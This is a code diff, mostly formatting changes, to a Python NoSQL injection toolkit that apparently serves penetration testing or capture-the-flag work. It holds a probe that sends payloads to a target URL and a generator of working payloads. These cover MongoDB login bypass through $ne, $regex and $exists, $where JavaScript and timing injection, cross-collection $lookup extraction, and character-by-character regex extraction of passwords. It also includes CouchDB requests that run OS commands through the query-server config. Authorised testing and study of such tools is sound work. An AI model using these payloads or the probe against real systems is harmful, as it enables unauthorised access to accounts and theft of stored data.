@@ -76,11 +76,17 @@ class NosqlProbeTool:
         ("1==1", "$where equality true"),
     ]
 
-
     # Aggregation pipeline injection payloads
     AGGREGATION_PAYLOADS: List[Tuple[dict, str]] = [
         (
-            {"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "leaked"}},
+            {
+                "$lookup": {
+                    "from": "users",
+                    "localField": "_id",
+                    "foreignField": "_id",
+                    "as": "leaked",
+                }
+            },
             "$lookup cross-collection data extraction",
         ),
         (
@@ -219,7 +225,9 @@ class NosqlProbeTool:
 
                 if success_indicators:
                     is_interesting = True
-                    reasons.append(f"Success indicators: {', '.join(success_indicators)}")
+                    reasons.append(
+                        f"Success indicators: {', '.join(success_indicators)}"
+                    )
 
                 length_diff = abs(resp_length - baseline_length)
                 if length_diff > 100 and resp_length > baseline_length:
@@ -228,7 +236,9 @@ class NosqlProbeTool:
 
                 if resp_status != baseline_status and resp_status == 200:
                     is_interesting = True
-                    reasons.append(f"Status changed: {baseline_status} -> {resp_status}")
+                    reasons.append(
+                        f"Status changed: {baseline_status} -> {resp_status}"
+                    )
 
                 if flag:
                     is_interesting = True
@@ -236,14 +246,16 @@ class NosqlProbeTool:
                     flags_found.append(flag)
 
                 if is_interesting:
-                    interesting.append({
-                        "payload": f"{param}{payload_suffix}",
-                        "type": "query_param",
-                        "desc": desc,
-                        "status": resp_status,
-                        "length": resp_length,
-                        "reasons": reasons,
-                    })
+                    interesting.append(
+                        {
+                            "payload": f"{param}{payload_suffix}",
+                            "type": "query_param",
+                            "desc": desc,
+                            "status": resp_status,
+                            "length": resp_length,
+                            "reasons": reasons,
+                        }
+                    )
 
             except Exception:
                 pass
@@ -275,9 +287,7 @@ class NosqlProbeTool:
                         url, params={param: json.dumps(payload_obj)}, timeout=timeout
                     )
                 else:
-                    resp = self.session.post(
-                        url, json=json_data, timeout=timeout
-                    )
+                    resp = self.session.post(url, json=json_data, timeout=timeout)
 
                 resp_text = resp.text
                 resp_length = len(resp_text)
@@ -298,7 +308,9 @@ class NosqlProbeTool:
 
                 if success_indicators:
                     is_interesting = True
-                    reasons.append(f"Success indicators: {', '.join(success_indicators)}")
+                    reasons.append(
+                        f"Success indicators: {', '.join(success_indicators)}"
+                    )
 
                 length_diff = abs(resp_length - baseline_length)
                 if length_diff > 100 and resp_length > baseline_length:
@@ -307,7 +319,9 @@ class NosqlProbeTool:
 
                 if resp_status != baseline_status and resp_status == 200:
                     is_interesting = True
-                    reasons.append(f"Status changed: {baseline_status} -> {resp_status}")
+                    reasons.append(
+                        f"Status changed: {baseline_status} -> {resp_status}"
+                    )
 
                 if flag:
                     is_interesting = True
@@ -315,14 +329,16 @@ class NosqlProbeTool:
                     flags_found.append(flag)
 
                 if is_interesting:
-                    interesting.append({
-                        "payload": json.dumps(payload_obj),
-                        "type": "json_body",
-                        "desc": desc,
-                        "status": resp_status,
-                        "length": resp_length,
-                        "reasons": reasons,
-                    })
+                    interesting.append(
+                        {
+                            "payload": json.dumps(payload_obj),
+                            "type": "json_body",
+                            "desc": desc,
+                            "status": resp_status,
+                            "length": resp_length,
+                            "reasons": reasons,
+                        }
+                    )
 
             except Exception:
                 pass
@@ -374,7 +390,9 @@ class NosqlProbeTool:
 
                 if success_indicators:
                     is_interesting = True
-                    reasons.append(f"Success indicators: {', '.join(success_indicators)}")
+                    reasons.append(
+                        f"Success indicators: {', '.join(success_indicators)}"
+                    )
 
                 length_diff = abs(resp_length - baseline_length)
                 if length_diff > 100 and resp_length > baseline_length:
@@ -383,7 +401,9 @@ class NosqlProbeTool:
 
                 if resp_status != baseline_status and resp_status == 200:
                     is_interesting = True
-                    reasons.append(f"Status changed: {baseline_status} -> {resp_status}")
+                    reasons.append(
+                        f"Status changed: {baseline_status} -> {resp_status}"
+                    )
 
                 if flag:
                     is_interesting = True
@@ -391,24 +411,30 @@ class NosqlProbeTool:
                     flags_found.append(flag)
 
                 if is_interesting:
-                    interesting.append({
+                    interesting.append(
+                        {
+                            "payload": f"$where: {where_payload}",
+                            "type": "$where",
+                            "desc": desc,
+                            "status": resp_status,
+                            "length": resp_length,
+                            "reasons": reasons,
+                        }
+                    )
+
+            except requests.exceptions.Timeout:
+                interesting.append(
+                    {
                         "payload": f"$where: {where_payload}",
                         "type": "$where",
                         "desc": desc,
-                        "status": resp_status,
-                        "length": resp_length,
-                        "reasons": reasons,
-                    })
-
-            except requests.exceptions.Timeout:
-                interesting.append({
-                    "payload": f"$where: {where_payload}",
-                    "type": "$where",
-                    "desc": desc,
-                    "status": "TIMEOUT",
-                    "length": 0,
-                    "reasons": ["Request timed out - possible $where sleep injection"],
-                })
+                        "status": "TIMEOUT",
+                        "length": 0,
+                        "reasons": [
+                            "Request timed out - possible $where sleep injection"
+                        ],
+                    }
+                )
             except Exception:
                 pass
 
@@ -529,9 +555,13 @@ class NosqlProbeTool:
         baseline_data = {**form_data, param: "test_baseline_value"}
         try:
             if method == "GET":
-                baseline_resp = self.session.get(url, params=baseline_data, timeout=timeout)
+                baseline_resp = self.session.get(
+                    url, params=baseline_data, timeout=timeout
+                )
             else:
-                baseline_resp = self.session.post(url, data=baseline_data, timeout=timeout)
+                baseline_resp = self.session.post(
+                    url, data=baseline_data, timeout=timeout
+                )
             baseline_length = len(baseline_resp.text)
             baseline_status = baseline_resp.status_code
         except Exception as exc:
@@ -545,8 +575,13 @@ class NosqlProbeTool:
         # Test query param injection
         if injection_type in ("query_param", "both"):
             interesting, errors, flags = self._test_query_param_injection(
-                url, method, param, form_data, timeout,
-                baseline_status, baseline_length,
+                url,
+                method,
+                param,
+                form_data,
+                timeout,
+                baseline_status,
+                baseline_length,
             )
             all_interesting.extend(interesting)
             all_errors.extend(errors)
@@ -555,8 +590,13 @@ class NosqlProbeTool:
         # Test JSON body injection
         if injection_type in ("json_body", "both"):
             interesting, errors, flags = self._test_json_body_injection(
-                url, method, param, form_data, timeout,
-                baseline_status, baseline_length,
+                url,
+                method,
+                param,
+                form_data,
+                timeout,
+                baseline_status,
+                baseline_length,
             )
             all_interesting.extend(interesting)
             all_errors.extend(errors)
@@ -564,8 +604,13 @@ class NosqlProbeTool:
 
         # Test $where injection (always tested)
         interesting, errors, flags = self._test_where_injection(
-            url, method, param, form_data, timeout,
-            baseline_status, baseline_length,
+            url,
+            method,
+            param,
+            form_data,
+            timeout,
+            baseline_status,
+            baseline_length,
         )
         all_interesting.extend(interesting)
         all_errors.extend(errors)
@@ -574,8 +619,13 @@ class NosqlProbeTool:
         # Test aggregation pipeline injection (always tested with JSON body)
         if injection_type in ("json_body", "both"):
             interesting, errors, flags = self._test_aggregation_injection(
-                url, method, param, form_data, timeout,
-                baseline_status, baseline_length,
+                url,
+                method,
+                param,
+                form_data,
+                timeout,
+                baseline_status,
+                baseline_length,
             )
             all_interesting.extend(interesting)
             all_errors.extend(errors)
@@ -609,13 +659,17 @@ class NosqlProbeTool:
                 output_lines.append(f"  Payload: {item['payload']}")
                 output_lines.append(f"    Type: {item['type']}")
                 output_lines.append(f"    Description: {item['desc']}")
-                output_lines.append(f"    Status: {item['status']}, Length: {item['length']}")
+                output_lines.append(
+                    f"    Status: {item['status']}, Length: {item['length']}"
+                )
                 for reason in item["reasons"]:
                     output_lines.append(f"    -> {reason}")
                 output_lines.append("")
         else:
             output_lines.append("No obviously interesting payloads found.")
-            output_lines.append("Consider trying different injection types or manual testing.")
+            output_lines.append(
+                "Consider trying different injection types or manual testing."
+            )
             output_lines.append("")
 
         # Error indicators detected
@@ -636,13 +690,21 @@ class NosqlProbeTool:
         output_lines.append("")
         output_lines.append("RECOMMENDATIONS:")
         if all_interesting:
-            output_lines.append("  - NoSQL injection likely! Try authentication bypass payloads.")
-            output_lines.append("  - Use nosql_payload_generator for complete bypass payloads.")
-            output_lines.append("  - Try regex-based data extraction with $regex operator.")
+            output_lines.append(
+                "  - NoSQL injection likely! Try authentication bypass payloads."
+            )
+            output_lines.append(
+                "  - Use nosql_payload_generator for complete bypass payloads."
+            )
+            output_lines.append(
+                "  - Try regex-based data extraction with $regex operator."
+            )
         else:
             output_lines.append("  - No clear NoSQL injection detected.")
             output_lines.append("  - Try different parameters or injection types.")
-            output_lines.append("  - Check if the application uses parameterized queries.")
+            output_lines.append(
+                "  - Check if the application uses parameterized queries."
+            )
 
         return "\n".join(output_lines)
 
@@ -684,18 +746,66 @@ class NosqlPayloadGenerator:
 
     # MongoDB query operators reference
     OPERATORS: List[Dict[str, str]] = [
-        {"operator": "$eq", "description": "Matches values equal to a specified value", "example": '{"field": {"$eq": "value"}}'},
-        {"operator": "$ne", "description": "Matches values not equal to a specified value", "example": '{"field": {"$ne": ""}}'},
-        {"operator": "$gt", "description": "Matches values greater than a specified value", "example": '{"field": {"$gt": ""}}'},
-        {"operator": "$gte", "description": "Matches values greater than or equal to a specified value", "example": '{"field": {"$gte": ""}}'},
-        {"operator": "$lt", "description": "Matches values less than a specified value", "example": '{"field": {"$lt": "~"}}'},
-        {"operator": "$lte", "description": "Matches values less than or equal to a specified value", "example": '{"field": {"$lte": "~"}}'},
-        {"operator": "$in", "description": "Matches any of the values specified in an array", "example": '{"field": {"$in": ["admin", "root"]}}'},
-        {"operator": "$nin", "description": "Matches none of the values specified in an array", "example": '{"field": {"$nin": []}}'},
-        {"operator": "$regex", "description": "Matches values via regular expression", "example": '{"field": {"$regex": "^admin"}}'},
-        {"operator": "$exists", "description": "Matches documents that have the specified field", "example": '{"field": {"$exists": true}}'},
-        {"operator": "$type", "description": "Matches documents where field is a specified BSON type", "example": '{"field": {"$type": "string"}}'},
-        {"operator": "$where", "description": "Matches documents that satisfy a JavaScript expression", "example": '{"$where": "this.field == true"}'},
+        {
+            "operator": "$eq",
+            "description": "Matches values equal to a specified value",
+            "example": '{"field": {"$eq": "value"}}',
+        },
+        {
+            "operator": "$ne",
+            "description": "Matches values not equal to a specified value",
+            "example": '{"field": {"$ne": ""}}',
+        },
+        {
+            "operator": "$gt",
+            "description": "Matches values greater than a specified value",
+            "example": '{"field": {"$gt": ""}}',
+        },
+        {
+            "operator": "$gte",
+            "description": "Matches values greater than or equal to a specified value",
+            "example": '{"field": {"$gte": ""}}',
+        },
+        {
+            "operator": "$lt",
+            "description": "Matches values less than a specified value",
+            "example": '{"field": {"$lt": "~"}}',
+        },
+        {
+            "operator": "$lte",
+            "description": "Matches values less than or equal to a specified value",
+            "example": '{"field": {"$lte": "~"}}',
+        },
+        {
+            "operator": "$in",
+            "description": "Matches any of the values specified in an array",
+            "example": '{"field": {"$in": ["admin", "root"]}}',
+        },
+        {
+            "operator": "$nin",
+            "description": "Matches none of the values specified in an array",
+            "example": '{"field": {"$nin": []}}',
+        },
+        {
+            "operator": "$regex",
+            "description": "Matches values via regular expression",
+            "example": '{"field": {"$regex": "^admin"}}',
+        },
+        {
+            "operator": "$exists",
+            "description": "Matches documents that have the specified field",
+            "example": '{"field": {"$exists": true}}',
+        },
+        {
+            "operator": "$type",
+            "description": "Matches documents where field is a specified BSON type",
+            "example": '{"field": {"$type": "string"}}',
+        },
+        {
+            "operator": "$where",
+            "description": "Matches documents that satisfy a JavaScript expression",
+            "example": '{"$where": "this.field == true"}',
+        },
     ]
 
     def __init__(self) -> None:
@@ -738,7 +848,10 @@ class NosqlPayloadGenerator:
             },
             {
                 "desc": "$exists bypass (field exists = always true for non-null)",
-                "payload": {"username": {"$exists": True}, "password": {"$exists": True}},
+                "payload": {
+                    "username": {"$exists": True},
+                    "password": {"$exists": True},
+                },
             },
             {
                 "desc": "Regex starts-with admin",
@@ -748,10 +861,12 @@ class NosqlPayloadGenerator:
 
         if target_field:
             # Add targeted payloads
-            json_payloads.append({
-                "desc": f"Target field '{target_field}' with $ne",
-                "payload": {target_field: {"$ne": ""}, "password": {"$ne": ""}},
-            })
+            json_payloads.append(
+                {
+                    "desc": f"Target field '{target_field}' with $ne",
+                    "payload": {target_field: {"$ne": ""}, "password": {"$ne": ""}},
+                }
+            )
 
         for i, entry in enumerate(json_payloads, 1):
             output_lines.append(f"{i}. {entry['desc']}")
@@ -765,10 +880,16 @@ class NosqlPayloadGenerator:
         query_payloads = [
             ("username[$ne]=&password[$ne]=", "$ne bypass via query params"),
             ("username[$gt]=&password[$gt]=", "$gt bypass via query params"),
-            ("username[$regex]=.*&password[$regex]=.*", "$regex bypass via query params"),
+            (
+                "username[$regex]=.*&password[$regex]=.*",
+                "$regex bypass via query params",
+            ),
             ("username=admin&password[$ne]=", "Target admin with $ne password"),
             ("username[$nin][]=&password[$nin][]=", "$nin bypass via query params"),
-            ("username[$exists]=true&password[$exists]=true", "$exists bypass via query params"),
+            (
+                "username[$exists]=true&password[$exists]=true",
+                "$exists bypass via query params",
+            ),
         ]
 
         for i, (payload, desc) in enumerate(query_payloads, len(json_payloads) + 1):
@@ -780,7 +901,10 @@ class NosqlPayloadGenerator:
         output_lines.append("")
         where_payloads = [
             ('{"$where": "return true"}', "Always-true JavaScript condition"),
-            ('{"$where": "this.password.match(/.*/)"}', "Regex match on password field"),
+            (
+                '{"$where": "this.password.match(/.*/)"}',
+                "Regex match on password field",
+            ),
             ('{"$where": "function(){return true}"}', "Function returning true"),
             ('{"$where": "1==1"}', "Simple equality that is always true"),
         ]
@@ -819,40 +943,50 @@ class NosqlPayloadGenerator:
         # Generate extraction templates
         if prefix:
             output_lines.append(f"  Starting from known prefix: '{prefix}'")
-            output_lines.append(f"  Next character test payloads:")
+            output_lines.append("  Next character test payloads:")
             output_lines.append("")
 
             # Show test payloads for next character after prefix
-            test_chars = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_-{}"
+            test_chars = (
+                "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_-{}"
+            )
             for c in test_chars[:10]:  # Show first 10 as examples
                 escaped = re.escape(prefix + c)
-                output_lines.append(
-                    f'    {{"{field}": {{"$regex": "^{escaped}"}}}}'
-                )
-            output_lines.append(f"    ... (continue for all printable characters)")
+                output_lines.append(f'    {{"{field}": {{"$regex": "^{escaped}"}}}}')
+            output_lines.append("    ... (continue for all printable characters)")
             output_lines.append("")
         else:
             output_lines.append("  First character test payloads:")
             output_lines.append("")
             test_chars = "abcdefghijklmnopqrstuvwxyz0123456789"
             for c in test_chars[:10]:  # Show first 10 as examples
-                output_lines.append(
-                    f'    {{"{field}": {{"$regex": "^{c}"}}}}'
-                )
-            output_lines.append(f"    ... (continue for all printable characters)")
+                output_lines.append(f'    {{"{field}": {{"$regex": "^{c}"}}}}')
+            output_lines.append("    ... (continue for all printable characters)")
             output_lines.append("")
 
         output_lines.append("--- Step 3: Binary approach for faster extraction ---")
         output_lines.append("  Instead of testing each character, use regex ranges:")
-        output_lines.append(f'    {{"{field}": {{"$regex": "^{re.escape(prefix)}[a-m]"}}}}  -> narrows to first or second half')
-        output_lines.append(f'    {{"{field}": {{"$regex": "^{re.escape(prefix)}[a-g]"}}}}  -> further narrow')
-        output_lines.append("  Continue binary splitting until single character is found.")
+        output_lines.append(
+            f'    {{"{field}": {{"$regex": "^{re.escape(prefix)}[a-m]"}}}}  -> narrows to first or second half'
+        )
+        output_lines.append(
+            f'    {{"{field}": {{"$regex": "^{re.escape(prefix)}[a-g]"}}}}  -> further narrow'
+        )
+        output_lines.append(
+            "  Continue binary splitting until single character is found."
+        )
         output_lines.append("")
 
         output_lines.append("--- Step 4: Determine value length ---")
-        output_lines.append(f'  {{"{field}": {{"$regex": "^.{{1}}$"}}}}   -> test if exactly 1 char')
-        output_lines.append(f'  {{"{field}": {{"$regex": "^.{{5}}$"}}}}   -> test if exactly 5 chars')
-        output_lines.append(f'  {{"{field}": {{"$regex": "^.{{10}}$"}}}}  -> test if exactly 10 chars')
+        output_lines.append(
+            f'  {{"{field}": {{"$regex": "^.{{1}}$"}}}}   -> test if exactly 1 char'
+        )
+        output_lines.append(
+            f'  {{"{field}": {{"$regex": "^.{{5}}$"}}}}   -> test if exactly 5 chars'
+        )
+        output_lines.append(
+            f'  {{"{field}": {{"$regex": "^.{{10}}$"}}}}  -> test if exactly 10 chars'
+        )
         output_lines.append("")
 
         output_lines.append("--- Common $regex patterns ---")
@@ -890,7 +1024,9 @@ class NosqlPayloadGenerator:
         output_lines.append("")
         output_lines.append("1. Authentication Bypass:")
         output_lines.append('   {"username": {"$ne": ""}, "password": {"$ne": ""}}')
-        output_lines.append('   Matches any document where username and password are not empty.')
+        output_lines.append(
+            "   Matches any document where username and password are not empty."
+        )
         output_lines.append("")
         output_lines.append("2. Data Extraction:")
         output_lines.append('   {"username": "admin", "password": {"$regex": "^a"}}')
@@ -898,11 +1034,11 @@ class NosqlPayloadGenerator:
         output_lines.append("")
         output_lines.append("3. Enumeration:")
         output_lines.append('   {"username": {"$regex": "^.{5}$"}}')
-        output_lines.append('   Finds usernames that are exactly 5 characters long.')
+        output_lines.append("   Finds usernames that are exactly 5 characters long.")
         output_lines.append("")
         output_lines.append("4. JavaScript Injection:")
         output_lines.append('   {"$where": "this.role == \'admin\'"}')
-        output_lines.append('   Matches documents where role field equals admin.')
+        output_lines.append("   Matches documents where role field equals admin.")
 
         return "\n".join(output_lines)
 
@@ -941,7 +1077,9 @@ class NosqlPayloadGenerator:
             output_lines.append(self._generate_auth_bypass(target_field))
 
         elif operation == "data_extraction":
-            output_lines.append(self._generate_data_extraction(target_field, known_prefix))
+            output_lines.append(
+                self._generate_data_extraction(target_field, known_prefix)
+            )
 
         elif operation == "operators":
             output_lines.append(self._generate_operators_reference())
@@ -1003,7 +1141,6 @@ class NosqlPayloadGenerator:
             "",
             "8. OS command execution (CouchDB < 3.x with config access):",
             "   PUT /_config/query_servers/cmd -d '\"id >/tmp/out\"'",
-            "   POST /{db}/_temp_view?limit=1 -d "
-            "'{\"language\":\"cmd\",\"map\":\"\"}'",
+            "   POST /{db}/_temp_view?limit=1 -d " '\'{"language":"cmd","map":""}\'',
         ]
         return "\n".join(lines)
